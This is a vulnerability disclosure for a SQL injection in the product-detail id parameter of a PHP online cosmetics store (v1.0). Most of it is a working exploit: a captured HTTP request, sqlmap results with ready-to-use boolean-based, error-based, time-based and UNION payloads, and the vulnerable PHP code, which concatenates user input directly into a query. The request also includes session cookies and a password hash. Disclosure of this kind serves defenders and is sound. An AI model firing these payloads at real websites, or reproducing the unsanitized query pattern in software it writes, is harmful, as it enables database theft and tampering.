# Exploit Title: Cosmetic and Beauty Products Online Shop 1.0 -SQL Injection

The id parameter on detail product on Cosmetics-and-Beauty-Product-Online-Store v1.0 appears to be vulnerable to SQL injection attacks. 

### Date: 
> 15 Apr 2023

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Cosmetics and Beauty Product Online Store](https://www.sourcecodester.com/php/15181/cosmetics-and-beauty-product-online-store-phpoop-free-source-code.html)
### Version:
> v 1.0

# Tested On: Windows 10, XAMPP

### Affected Page:
> view_product.php


### Description:
> The id parameter on detail product on Cosmetics-and-Beauty-Product-Online-Store v1.0 appears to be vulnerable to SQL injection attacks. 

### Proof of Concept:
> Following steps are involved:
1. Visit the vulnerable page: /cbpos/?p=view_product&id=ID_VULN
2. Copy request to a txt file and run with SQLmap
Request
```
GET /cbpos/?p=view_product&id=c4ca4238a0b923820dcc509a6f75849b HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/cbpos/
Connection: close
Cookie: eid=2; download_started=0; plupload_ui_view=thumbs; PowerBB_username=tuanth; PowerBB_password=32298fc135b3fecf012a4c27efbba188; jstree_select=1; PHPSESSID=51spndcudrtniksvqgp19cifo8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

3. Result
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=view_product&id=c4ca4238a0b923820dcc509a6f75849b' AND 3108=3108 AND 'cryv'='cryv

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: p=view_product&id=c4ca4238a0b923820dcc509a6f75849b' AND (SELECT 4233 FROM(SELECT COUNT(*),CONCAT(0x71706a6b71,(SELECT (ELT(4233=4233,1))),0x7178766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'czMR'='czMR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=view_product&id=c4ca4238a0b923820dcc509a6f75849b' AND (SELECT 4664 FROM (SELECT(SLEEP(5)))fagQ) AND 'ueiB'='ueiB

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: p=view_product&id=-3841' UNION ALL SELECT CONCAT(0x71706a6b71,0x62564d4b78634f6d63565766636a536f6a635a766d735764704f6c65737a6b4c664e61636d4e6b70,0x7178766271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[13:06:04] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.54, PHP 8.2.0
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```
4. CODE
```
<?php 
 $products = $conn->query("SELECT p.*,b.name as bname,c.category FROM `products` p inner join brands b on p.brand_id = b.id inner join categories c on p.category_id = c.id where md5(p.id) = '{$_GET['id']}' ");
 if($products->num_rows > 0){
     foreach($products->fetch_assoc() as $k => $v){
         $$k= stripslashes($v);
     }
    $upload_path = base_app.'/uploads/product_'.$id;
    $img = "";
    if(is_dir($upload_path)){
        $fileO = scandir($upload_path);
        if(isset($fileO[2]))
            $img = "uploads/product_".$id."/".$fileO[2];
        // var_dump($fileO);
    }
    $inventory = $conn->query("SELECT * FROM inventory where product_id = ".$id." order by variant asc");
    $inv = array();
    while($ir = $inventory->fetch_assoc()){
        $ir['price'] = format_num($ir['price']);
        $ir['stock'] = $ir['quantity'];
        $sold = $conn->query("SELECT sum(quantity) FROM `order_list` where inventory_id = '{$ir['id']}' and order_id in (SELECT order_id from `sales`)")->fetch_array()[0];
        $sold = $sold > 0 ? $sold : 0;
        $ir['stock'] = $ir['stock'] - $sold;
        $inv[] = $ir;
    }
 }
 
?>
```

5. Successful exploit screenshots are below (with id parameter)
![Example Image](https://drive.google.com/uc?id=1oHt3zLrp6Xa183tPQSaNGxhhWv1mcdrL)


Video POC here:
[POC SQLi](https://drive.google.com/file/d/1IR-KPtRaTDKpOgUaMxBB1l_j_bfzZtyL/view?usp=sharing)

### Impact:
> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
